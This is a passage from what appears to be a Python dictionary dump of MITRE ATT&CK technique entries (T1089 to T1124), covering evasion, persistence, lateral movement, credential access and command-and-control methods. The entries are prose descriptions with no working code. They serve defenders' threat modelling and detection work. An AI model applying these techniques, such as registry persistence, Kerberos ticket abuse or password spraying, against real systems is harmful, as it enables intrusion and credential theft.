           'name': 'Bypass User Account Control',
           'platforms': ['Windows']},
 'T1089': {'attack_id': 'T1089',
           'categories': ['defense-evasion'],
           'description': 'Adversaries may disable security tools to avoid possible detection of their tools and '
                          'activities. This can take the form of killing security software or event logging processes, '
                          'deleting Registry keys so that tools do not start at run time, or other methods to '
                          'interfere with security scanning or event reporting.',
           'name': 'Disabling Security Tools',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1090': {'attack_id': 'T1090',
           'categories': ['command-and-control'],
           'description': 'A connection proxy is used to direct network traffic between systems or act as an '
                          'intermediary for network communications. Many tools exist that enable traffic redirection '
                          'through proxies or port redirection, including '
                          '[HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend '
                          'Micro APT Attack Tools)\n'
                          '\n'
                          'The definition of a proxy can also be expanded out to encompass trust relationships between '
                          'networks in peer-to-peer, mesh, or trusted connections between networks consisting of hosts '
                          'or systems that regularly communicate with each other.\n'
                          '\n'
                          'The network may be within a single organization or across organizations with trust '
                          'relationships. Adversaries could use these types of relationships to manage command and '
                          'control communications, to reduce the number of simultaneous outbound network connections, '
                          'to provide resiliency in the face of connection loss, or to ride over existing trusted '
                          'communications paths between victims to avoid suspicion.',
           'name': 'Connection Proxy',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1091': {'attack_id': 'T1091',
           'categories': ['lateral-movement', 'initial-access'],
           'description': 'Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, '
                          'by copying malware to removable media and taking advantage of Autorun features when the '
                          'media is inserted into a system and executes. In the case of Lateral Movement, this may '
                          'occur through modification of executable files stored on removable media or by copying '
                          'malware and renaming it to look like a legitimate file to trick users into executing it on '
                          'a separate system. In the case of Initial Access, this may occur through manual '
                          'manipulation of the media, modification of systems used to initially format the media, or '
                          "modification to the media's firmware itself.",
           'name': 'Replication Through Removable Media',
           'platforms': ['Windows']},
 'T1092': {'attack_id': 'T1092',
           'categories': ['command-and-control'],
           'description': 'Adversaries can perform command and control between compromised hosts on potentially '
                          'disconnected networks using removable media to transfer commands from system to system. '
                          'Both systems would need to be compromised, with the likelihood that an Internet-connected '
                          'system was compromised first and the second through lateral movement by [Replication '
                          'Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands and files '
                          'would be relayed from the disconnected system to the Internet-connected system to which the '
                          'adversary has direct access.',
           'name': 'Communication Through Removable Media',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1093': {'attack_id': 'T1093',
           'categories': ['defense-evasion'],
           'description': 'Process hollowing occurs when a process is created in a suspended state then its memory is '
                          'unmapped and replaced with malicious code. Similar to [Process '
                          'Injection](https://attack.mitre.org/techniques/T1055), execution of the malicious code is '
                          'masked under a legitimate process and may evade defenses and detection analysis. (Citation: '
                          'Leitch Hollowing) (Citation: Endgame Process Injection July 2017)',
           'name': 'Process Hollowing',
           'platforms': ['Windows']},
 'T1094': {'attack_id': 'T1094',
           'categories': ['command-and-control'],
           'description': 'Adversaries may communicate using a custom command and control protocol instead of '
                          'encapsulating commands/data in an existing [Standard Application Layer '
                          'Protocol](https://attack.mitre.org/techniques/T1071). Implementations include mimicking '
                          'well-known protocols or developing custom protocols (including raw sockets) on top of '
                          'fundamental protocols provided by TCP/IP/another standard network stack.',
           'name': 'Custom Command and Control Protocol',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1095': {'attack_id': 'T1095',
           'categories': ['command-and-control'],
           'description': 'Use of a standard non-application layer protocol for communication between host and C2 '
                          'server or among infected hosts within a network. The list of possible protocols is '
                          'extensive. (Citation: Wikipedia OSI) Specific examples include use of network layer '
                          'protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, '
                          'such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure '
                          '(SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n'
                          '\n'
                          'ICMP communication between hosts is one example. Because ICMP is part of the Internet '
                          'Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: '
                          'Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such '
                          'as TCP or UDP and may be used by adversaries to hide communications.',
           'name': 'Standard Non-Application Layer Protocol',
           'platforms': ['Windows', 'Linux', 'macOS']},
 'T1096': {'attack_id': 'T1096',
           'categories': ['defense-evasion'],
           'description': 'Every New Technology File System (NTFS) formatted partition contains a Master File Table '
                          '(MFT) that maintains a record for every file/directory on the partition. (Citation: '
                          'SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: '
                          'Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known '
                          'as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be '
                          'used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based '
                          'Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) '
                          '(Citation: Microsoft ADS Mar 2014)\n'
                          '\n'
                          'Adversaries may store malicious data or binaries in file attribute metadata instead of '
                          'directly in files. This may be done to evade some defenses, such as static indicator '
                          'scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: '
                          'MalwareBytes ADS July 2015)',
           'name': 'NTFS File Attributes',
           'platforms': ['Windows']},
 'T1097': {'attack_id': 'T1097',
           'categories': ['lateral-movement'],
           'description': 'Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets '
                          "without having access to an account's password. Kerberos authentication can be used as the "
                          'first step to lateral movement to a remote system.\n'
                          '\n'
                          'In this technique, valid Kerberos tickets for [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078) are captured by [Credential '
                          "Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket "
                          'granting ticket (TGT) may be obtained, depending on the level of access. A service ticket '
                          'allows for access to a particular resource, whereas a TGT can be used to request service '
                          'tickets from the Ticket Granting Service (TGS) to access any resource the user has '
                          'privileges to access. (Citation: ADSecurity AD Kerberos Attacks) (Citation: GentilKiwi Pass '
                          'the Ticket)\n'
                          '\n'
                          'Silver Tickets can be obtained for services that use Kerberos as an authentication '
                          'mechanism and are used to generate tickets to access that particular resource and the '
                          'system that hosts the resource (e.g., SharePoint). (Citation: ADSecurity AD Kerberos '
                          'Attacks)\n'
                          '\n'
                          'Golden Tickets can be obtained for the domain using the Key Distribution Service account '
                          'KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active '
                          'Directory. (Citation: Campbell 2014)',
           'name': 'Pass the Ticket',
           'platforms': ['Windows']},
 'T1098': {'attack_id': 'T1098',
           'categories': ['credential-access', 'persistence'],
           'description': 'Account manipulation may aid adversaries in maintaining access to credentials and certain '
                          'permission levels within an environment. Manipulation could consist of modifying '
                          'permissions, modifying credentials, adding or changing permission groups, modifying account '
                          'settings, or modifying how authentication is performed. These actions could also include '
                          'account activity designed to subvert security policies, such as performing iterative '
                          'password updates to subvert password duration policies and preserve the life of compromised '
                          'credentials. In order to create or manipulate accounts, the adversary must already have '
                          'sufficient permissions on systems or the domain.',
           'name': 'Account Manipulation',
           'platforms': ['Windows']},
 'T1099': {'attack_id': 'T1099',
           'categories': ['defense-evasion'],
           'description': 'Timestomping is a technique that modifies the timestamps of a file (the modify, access, '
                          'create, and change times), often to mimic files that are in the same folder. This is done, '
                          'for example, on files that have been modified or created by the adversary so that they do '
                          'not appear conspicuous to forensic investigators or file analysis tools. Timestomping may '
                          'be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to '
                          'hide malware and tools. (Citation: WindowsIR Anti-Forensic Techniques)',
           'name': 'Timestomp',
           'platforms': ['Linux', 'Windows']},
 'T1100': {'attack_id': 'T1100',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'A Web shell is a Web script that is placed on an openly accessible Web server to allow an '
                          'adversary to use the Web server as a gateway into a network. A Web shell may provide a set '
                          'of functions to execute or a command-line interface on the system that hosts the Web '
                          'server. In addition to a server-side script, a Web shell may have a client interface '
                          'program that is used to talk to the Web server (see, for example, China Chopper Web shell '
                          'client). (Citation: Lee 2013)\n'
                          '\n'
                          'Web shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as '
                          "a persistence mechanism in case an adversary's primary access methods are detected and "
                          'removed.',
           'name': 'Web Shell',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1101': {'attack_id': 'T1101',
           'categories': ['persistence'],
           'description': 'Windows Security Support Provider (SSP) DLLs are loaded into the Local Security Authority '
                          '(LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted '
                          "and plaintext passwords that are stored in Windows, such as any logged-on user's Domain "
                          'password or smart card PINs. The SSP configuration is stored in two Registry keys: '
                          '<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and '
                          '<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An '
                          'adversary may modify these Registry keys to add new SSPs, which will be loaded the next '
                          'time the system boots, or when the AddSecurityPackage Windows API function is called.\n'
                          ' (Citation: Graeber 2014)',
           'name': 'Security Support Provider',
           'platforms': ['Windows']},
 'T1102': {'attack_id': 'T1102',
           'categories': ['command-and-control', 'defense-evasion'],
           'description': 'Adversaries may use an existing, legitimate external Web service as a means for relaying '
                          'commands to a compromised system.\n'
                          '\n'
                          'These commands may also include pointers to command and control (C2) infrastructure. '
                          'Adversaries may post content, known as a dead drop resolver, on Web services with embedded '
                          '(and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach '
                          'out to and be redirected by these resolvers.\n'
                          '\n'
                          'Popular websites and social media acting as a mechanism for C2 may give a significant '
                          'amount of cover due to the likelihood that hosts within a network are already communicating '
                          'with them prior to a compromise. Using common services, such as those offered by Google or '
                          'Twitter, makes it easier for adversaries to hide in expected noise. Web service providers '
                          'commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n'
                          '\n'
                          'Use of Web services may also protect back-end C2 infrastructure from discovery through '
                          'malware binary analysis while also enabling operational resiliency (since this '
                          'infrastructure may be dynamically changed).',
           'name': 'Web Service',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1103': {'attack_id': 'T1103',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry '
                          'keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows '
                          'NT\\CurrentVersion\\Windows</code> or '
                          '<code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows '
                          'NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads '
                          'user32.dll. In practice this is nearly every program, since user32.dll is a very common '
                          'library. (Citation: Endgame Process Injection July 2017) Similar to [Process '
                          'Injection](https://attack.mitre.org/techniques/T1055), these values can be abused to obtain '
                          'persistence and privilege escalation by causing a malicious DLL to be loaded and run in the '
                          'context of separate processes on the computer. (Citation: AppInit Registry)\n'
                          '\n'
                          'The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot '
                          'is enabled. (Citation: AppInit Secure Boot)',
           'name': 'AppInit DLLs',
           'platforms': ['Windows']},
 'T1104': {'attack_id': 'T1104',
           'categories': ['command-and-control'],
           'description': 'Adversaries may create multiple stages for command and control that are employed under '
                          'different conditions or for certain functions. Use of multiple stages may obfuscate the '
                          'command and control channel to make detection more difficult.\n'
                          '\n'
                          'Remote access tools will call back to the first-stage command and control server for '
                          'instructions. The first stage may have automated capabilities to collect basic host '
                          'information, update tools, and upload additional files. A second remote access tool (RAT) '
                          'could be uploaded at that point to redirect the host to the second-stage command and '
                          'control server. The second stage will likely be more fully featured and allow the adversary '
                          'to interact with the system through a reverse shell and additional RAT features.\n'
                          '\n'
                          'The different stages will likely be hosted separately with no overlapping infrastructure. '
                          'The loader may also have backup first-stage callbacks or [Fallback '
                          'Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage '
                          'communication path is discovered and blocked.',
           'name': 'Multi-Stage Channels',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1105': {'attack_id': 'T1105',
           'categories': ['command-and-control', 'lateral-movement'],
           'description': 'Files may be copied from one system to another to stage adversary tools or other files over '
                          'the course of an operation. Files may be copied from an external adversary-controlled '
                          'system through the Command and Control channel to bring tools into the victim network or '
                          'through alternate protocols with another tool such as '
                          '[FTP](https://attack.mitre.org/software/S0095). Files can also be copied over on Mac and '
                          'Linux with native tools like scp, rsync, and sftp.\n'
                          '\n'
                          'Adversaries may also copy files laterally between internal victim systems to support '
                          'Lateral Movement with remote Execution using inherent file sharing protocols such as file '
                          'sharing over SMB to connected network shares or with authenticated connections with '
                          '[Windows Admin Shares](https://attack.mitre.org/techniques/T1077) or [Remote Desktop '
                          'Protocol](https://attack.mitre.org/techniques/T1076).',
           'name': 'Remote File Copy',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1106': {'attack_id': 'T1106',
           'categories': ['execution'],
           'description': 'Adversary tools may directly use the Windows application programming interface (API) to '
                          'execute binaries. Functions such as the Windows API CreateProcess will allow programs and '
                          'scripts to start other processes with proper path and argument parameters. (Citation: '
                          'Microsoft CreateProcess)\n'
                          '\n'
                          'Additional Windows API calls that can be used to execute binaries include: (Citation: '
                          'Kanthak Verifier)\n'
                          '\n'
                          '* CreateProcessA() and CreateProcessW(),\n'
                          '* CreateProcessAsUserA() and CreateProcessAsUserW(),\n'
                          '* CreateProcessInternalA() and CreateProcessInternalW(),\n'
                          '* CreateProcessWithLogonW(), CreateProcessWithTokenW(),\n'
                          '* LoadLibraryA() and LoadLibraryW(),\n'
                          '* LoadLibraryExA() and LoadLibraryExW(),\n'
                          '* LoadModule(),\n'
                          '* LoadPackagedLibrary(),\n'
                          '* WinExec(),\n'
                          '* ShellExecuteA() and ShellExecuteW(),\n'
                          '* ShellExecuteExA() and ShellExecuteExW()',
           'name': 'Execution through API',
           'platforms': ['Windows']},
 'T1107': {'attack_id': 'T1107',
           'categories': ['defense-evasion'],
           'description': 'Malware, tools, or other non-native files dropped or created on a system by an adversary '
                          'may leave traces behind as to what was done within a network and how. Adversaries may '
                          'remove these files over the course of an intrusion to keep their footprint low or remove '
                          'them at the end as part of the post-intrusion cleanup process.\n'
                          '\n'
                          'There are tools available from the host operating system to perform cleanup, but '
                          'adversaries may use other tools as well. Examples include native '
                          '[cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools '
                          'such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: '
                          'Trend Micro APT Attack Tools)',
           'name': 'File Deletion',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1108': {'attack_id': 'T1108',
           'categories': ['defense-evasion', 'persistence'],
           'description': 'Adversaries may use more than one remote access tool with varying command and control '
                          'protocols as a hedge against detection. If one type of tool is detected and blocked or '
                          'removed as a response but the organization did not gain a full understanding of the '
                          "adversary's tools and access, then the adversary will be able to retain access to the "
                          'network. Adversaries may also attempt to gain access to [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078) to use [External Remote '
                          'Services](https://attack.mitre.org/techniques/T1133) such as external VPNs as a way to '
                          'maintain access despite interruptions to remote access tools deployed within a target '
                          'network. (Citation: Mandiant APT1)\n'
                          '\n'
                          'Use of a [Web Shell](https://attack.mitre.org/techniques/T1100) is one such way to maintain '
                          'access to a network through an externally accessible Web server.',
           'name': 'Redundant Access',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1109': {'attack_id': 'T1109',
           'categories': ['defense-evasion', 'persistence'],
           'description': 'Some adversaries may employ sophisticated means to compromise computer components and '
                          'install malicious firmware that will execute adversary code outside of the operating system '
                          'and main system firmware or BIOS. This technique may be similar to [System '
                          'Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system '
                          'components that may not have the same capability or level of integrity checking. Malicious '
                          'device firmware could provide both a persistent level of access to systems despite '
                          'potential typical failures to maintain access and hard disk re-images, as well as a way to '
                          'evade host software-based defenses and integrity checks.',
           'name': 'Component Firmware',
           'platforms': ['Windows']},
 'T1110': {'attack_id': 'T1110',
           'categories': ['credential-access'],
           'description': 'Adversaries may use brute force techniques to attempt access to accounts when passwords are '
                          'unknown or when password hashes are obtained.\n'
                          '\n'
                          '[Credential Dumping](https://attack.mitre.org/techniques/T1003) is used to obtain password '
                          'hashes, this may only get an adversary so far when [Pass the '
                          'Hash](https://attack.mitre.org/techniques/T1075) is not an option. Techniques to '
                          'systematically guess the passwords used to compute hashes are available, or the adversary '
                          'may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on '
                          'adversary-controlled systems outside of the target network. (Citation: Wikipedia Password '
                          'cracking)\n'
                          '\n'
                          'Adversaries may attempt to brute force logins without knowledge of passwords or hashes '
                          'during an operation either with zero knowledge or by attempting a list of known or possible '
                          'passwords. This is a riskier option because it could cause numerous authentication failures '
                          "and account lockouts, depending on the organization's login failure policies. (Citation: "
                          'Cylance Cleaver)\n'
                          '\n'
                          "A related technique called password spraying uses one password (e.g. 'Password01'), or a "
                          'small list of passwords, that matches the complexity policy of the domain and may be a '
                          'commonly used password. Logins are attempted with that password and many different accounts '
                          'on a network to avoid account lockouts that would normally occur when brute forcing a '
                          'single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)\n'
                          '\n'
                          'Typically, management services over commonly used ports are used when password spraying. '
                          'Commonly targeted services include the following:\n'
                          '\n'
                          '* SSH (22/TCP)\n'
                          '* Telnet (23/TCP)\n'
                          '* FTP (21/TCP)\n'
                          '* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n'
                          '* LDAP (389/TCP)\n'
                          '* Kerberos (88/TCP)\n'
                          '* RDP / Terminal Services (3389/TCP)\n'
                          '* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n'
                          '* MSSQL (1433/TCP)\n'
                          '* Oracle (1521/TCP)\n'
                          '* MySQL (3306/TCP)\n'
                          '* VNC (5900/TCP)\n'
                          '\n'
                          '\n'
                          'In default environments, LDAP and Kerberos connection attempts are less likely to trigger '
                          'events over SMB, which creates Windows "logon failure" event ID 4625.',
           'name': 'Brute Force',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1111': {'attack_id': 'T1111',
           'categories': ['credential-access'],
           'description': 'Use of two- or multifactor authentication is recommended and provides a higher level of '
                          'security than user names and passwords alone, but organizations should be aware of '
                          'techniques that could be used to intercept and bypass these security mechanisms. '
                          'Adversaries may target authentication mechanisms, such as smart cards, to gain access to '
                          'systems, services, and network resources.\n'
                          '\n'
                          'If a smart card is used for two-factor authentication (2FA), then a keylogger will need to '
                          'be used to obtain the password associated with a smart card during normal use. With both an '
                          'inserted card and access to the smart card password, an adversary can connect to a network '
                          'resource using the infected system to proxy the authentication with the inserted hardware '
                          'token. (Citation: Mandiant M Trends 2011)\n'
                          '\n'
                          'Adversaries may also employ a keylogger to similarly target other hardware tokens, such as '
                          "RSA SecurID. Capturing token input (including a user's personal identification code) may "
                          'provide temporary access (i.e. replay the one-time passcode until the next value rollover) '
                          'as well as possibly enabling adversaries to reliably predict future authentication values '
                          '(given access to both the algorithm and any seed values used to generate appended temporary '
                          'codes). (Citation: GCN RSA June 2011)\n'
                          '\n'
                          'Other methods of 2FA may be intercepted and used by an adversary to authenticate. It is '
                          'common for one-time codes to be sent via out-of-band communications (email, SMS). If the '
                          'device and/or service is not secured, then it may be vulnerable to interception. Although '
                          'primarily focused on by cyber criminals, these authentication mechanisms have been targeted '
                          'by advanced actors. (Citation: Operation Emmental)',
           'name': 'Two-Factor Authentication Interception',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1112': {'attack_id': 'T1112',
           'categories': ['defense-evasion'],
           'description': 'Adversaries may interact with the Windows Registry to hide configuration information within '
                          'Registry keys, remove information as part of cleaning up, or as part of other techniques to '
                          'aid in Persistence and Execution.\n'
                          '\n'
                          'Access to specific areas of the Registry depends on account permissions, some requiring '
                          'administrator-level access. The built-in Windows command-line utility '
                          '[Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry '
                          'modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote '
                          'access tool, which may contain functionality to interact with the Registry through the '
                          'Windows API (see examples).\n'
                          '\n'
                          'Registry modifications may also include actions to hide keys, such as prepending key names '
                          'with a null character, which will cause an error and/or be ignored when read via '
                          '[Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. '
                          '(Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to '
                          'conceal payloads/commands used to establish Persistence. (Citation: TrendMicro POWELIKS AUG '
                          '2014) (Citation: SpectorOps Hiding Reg Jul 2017)\n'
                          '\n'
                          'The Registry of a remote system may be modified to aid in execution of files as part of '
                          'Lateral Movement. It requires the remote Registry service to be running on the target '
                          'system. (Citation: Microsoft Remote) Often [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the '
                          "remote system's [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) for RPC "
                          'communication.',
           'name': 'Modify Registry',
           'platforms': ['Windows']},
 'T1113': {'attack_id': 'T1113',
           'categories': ['collection'],
           'description': 'Adversaries may attempt to take screen captures of the desktop to gather information over '
                          'the course of an operation. Screen capturing functionality may be included as a feature of '
                          'a remote access tool used in post-compromise operations.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'On OSX, the native command <code>screencapture</code> is used to capture screenshots.\n'
                          '\n'
                          '### Linux\n'
                          '\n'
                          'On Linux, there is the native command <code>xwd</code>. (Citation: Antiquated Mac Malware)',
           'name': 'Screen Capture',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1114': {'attack_id': 'T1114',
           'categories': ['collection'],
           'description': 'Adversaries may target user email to collect sensitive information from a target.\n'
                          '\n'
                          "Files containing email data can be acquired from a user's system, such as Outlook storage "
                          'or cache files .pst and .ost.\n'
                          '\n'
                          "Adversaries may leverage a user's credentials and interact directly with the Exchange "
                          'server to acquire information from within a network.\n'
                          '\n'
                          'Some adversaries may acquire user credentials and access externally facing webmail '
                          'applications, such as Outlook Web Access.',
           'name': 'Email Collection',
           'platforms': ['Windows']},
 'T1115': {'attack_id': 'T1115',
           'categories': ['collection'],
           'description': 'Adversaries may collect data stored in the Windows clipboard from users copying information '
                          'within or between applications. \n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'Applications can access clipboard data by using the Windows API. (Citation: MSDN '
                          'Clipboard) \n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'OSX provides a native command, <code>pbpaste</code>, to grab clipboard contents  (Citation: '
                          'Operating with EmPyre).',
           'name': 'Clipboard Data',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1116': {'attack_id': 'T1116',
           'categories': ['defense-evasion'],
           'description': 'Code signing provides a level of authenticity on a binary from the developer and a '
                          'guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) '
                          'However, adversaries are known to use code signing certificates to masquerade malware and '
                          'tools as legitimate binaries (Citation: Janicab). The certificates used during an operation '
                          'may be created, forged, or stolen by the adversary. (Citation: Securelist Digital '
                          'Certificates) (Citation: Symantec Digital Certificates)\n'
                          '\n'
                          'Code signing to verify software on first run can be used on modern Windows and macOS/OS X '
                          'systems. It is not used on Linux due to the decentralized nature of the platform. '
                          '(Citation: Wikipedia Code Signing)\n'
                          '\n'
                          'Code signing certificates may be used to bypass security policies that require signed code '
                          'to execute on a system.',
           'name': 'Code Signing',
           'platforms': ['macOS', 'Windows']},
 'T1117': {'attack_id': 'T1117',
           'categories': ['defense-evasion', 'execution'],
           'description': 'Regsvr32.exe is a command-line program used to register and unregister object linking and '
                          'embedding controls, including dynamic link libraries (DLLs), on Windows systems. '
                          'Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)\n'
                          '\n'
                          'Adversaries may take advantage of this functionality to proxy execution of code to avoid '
                          'triggering security tools that may not monitor execution of, and modules loaded by, the '
                          'regsvr32.exe process because of whitelists or false positives from Windows using '
                          'regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.\n'
                          '\n'
                          'Regsvr32.exe can also be used to specifically bypass process whitelisting using '
                          'functionality to load COM scriptlets to execute DLLs under user permissions. Since '
                          'regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform '
                          'resource locator (URL) to file on an external Web server as an argument during invocation. '
                          'This method makes no changes to the Registry as the COM object is not actually registered, '
                          'only executed. (Citation: SubTee Regsvr32 Whitelisting Bypass) This variation of the '
                          'technique is often referred to as a "Squiblydoo" attack and has been used in campaigns '
                          'targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye '
                          'Regsvr32 Targeting Mongolian Gov)\n'
                          '\n'
                          'Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence '
                          'via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). '
                          '(Citation: Carbon Black Squiblydoo Apr 2016)',
           'name': 'Regsvr32',
           'platforms': ['Windows']},
 'T1118': {'attack_id': 'T1118',
           'categories': ['defense-evasion', 'execution'],
           'description': 'InstallUtil is a command-line utility that allows for installation and uninstallation of '
                          'resources by executing specific installer components specified in .NET binaries. (Citation: '
                          'MSDN InstallUtil) InstallUtil is located in the .NET directories on a Windows system: '
                          '<code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> and '
                          '<code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>. '
                          'InstallUtil.exe is digitally signed by Microsoft.\n'
                          '\n'
                          'Adversaries may use InstallUtil to proxy execution of code through a trusted Windows '
                          'utility. InstallUtil may also be used to bypass process whitelisting through use of '
                          'attributes within the binary that execute the class decorated with the attribute '
                          '<code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: SubTee GitHub All The '
                          'Things Application Whitelisting Bypass)',
           'name': 'InstallUtil',
           'platforms': ['Windows']},
 'T1119': {'attack_id': 'T1119',
           'categories': ['collection'],
           'description': 'Once established within a system or network, an adversary may use automated techniques for '
                          'collecting internal data. Methods for performing this technique could include use of '
                          '[Scripting](https://attack.mitre.org/techniques/T1064) to search for and copy information '
                          'fitting set criteria such as file type, location, or name at specific time intervals. This '
                          'functionality could also be built into remote access tools. \n'
                          '\n'
                          'This technique may incorporate use of other techniques such as [File and Directory '
                          'Discovery](https://attack.mitre.org/techniques/T1083) and [Remote File '
                          'Copy](https://attack.mitre.org/techniques/T1105) to identify and move files.',
           'name': 'Automated Collection',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1120': {'attack_id': 'T1120',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to gather information about attached peripheral devices and '
                          'components connected to a computer system. The information may be used to enhance their '
                          'awareness of the system and network environment or may be used for further actions.',
           'name': 'Peripheral Device Discovery',
           'platforms': ['Windows']},
 'T1121': {'attack_id': 'T1121',
           'categories': ['defense-evasion', 'execution'],
           'description': 'Regsvcs and Regasm are Windows command-line utilities that are used to register .NET '
                          'Component Object Model (COM) assemblies. Both are digitally signed by Microsoft. (Citation: '
                          'MSDN Regsvcs) (Citation: MSDN Regasm)\n'
                          '\n'
                          'Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows '
                          'utility. Both utilities may be used to bypass process whitelisting through use of '
                          'attributes within the binary to specify code that should be run before registration or '
                          'unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> '
                          'respectively. The code with the registration and unregistration attributes will be executed '
                          'even if the process is run under insufficient privileges and fails to execute. (Citation: '
                          'SubTee GitHub All The Things Application Whitelisting Bypass)',
           'name': 'Regsvcs/Regasm',
           'platforms': ['Windows']},
 'T1122': {'attack_id': 'T1122',
           'categories': ['defense-evasion', 'persistence'],
           'description': 'The Component Object Model (COM) is a system within Windows to enable interaction between '
                          'software components through the operating system. (Citation: Microsoft Component Object '
                          'Model) Adversaries can use this system to insert malicious code that can be executed in '
                          'place of legitimate software through hijacking the COM references and relationships as a '
                          'means for persistence. Hijacking a COM object requires a change in the Windows Registry to '
                          'replace a reference to a legitimate system component which may cause that component to not '
                          'work when executed. When that system component is executed through normal system operation '
                          "the adversary's code will be executed instead. (Citation: GDATA COM Hijacking) An adversary "
                          'is likely to hijack objects that are used frequently enough to maintain a consistent level '
                          'of persistence, but are unlikely to break noticeable functionality within the system as to '
                          'avoid system instability that could lead to detection.',
           'name': 'Component Object Model Hijacking',
           'platforms': ['Windows']},
 'T1123': {'attack_id': 'T1123',
           'categories': ['collection'],
           'description': "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) "
                          'or applications (e.g., voice and video call services) to capture audio recordings for the '
                          'purpose of listening into sensitive conversations to gather information.\n'
                          '\n'
                          'Malware or scripts may be used to interact with the devices through an available API '
                          'provided by the operating system or an application to capture audio. Audio files may be '
                          'written to disk and exfiltrated later.',
           'name': 'Audio Capture',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1124': {'attack_id': 'T1124',
           'categories': ['discovery'],
           'description': 'The system time is set and stored by the Windows Time Service within a domain to maintain '
                          'time synchronization between systems and services in an enterprise network. (Citation: MSDN '
                          'System Time) (Citation: Technet Windows Time Service)\n'
                          '\n'
                          'An adversary may gather the system time and/or time zone from a local or remote system. '
                          'This information may be gathered in a number of ways, such as with '
                          '[Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time '
                          "\\\\hostname</code> to gather the system time on a remote system. The victim's time zone "
                          'may also be inferred from the current system time or gathered by using <code>w32tm '
                          '/tz</code>. (Citation: Technet Windows Time Service) The information could be useful for '
                          'performing other techniques, such as executing a file with a [Scheduled '
                          "Task](https://attack.mitre.org/techniques/T1053) (Citation: RSA EU12 They're Inside), or to "
                          'discover locality information based on time zone to assist in victim targeting.',
           'name': 'System Time Discovery',
           'platforms': ['Windows']},
 'T1125': {'attack_id': 'T1125',
           'categories': ['collection'],
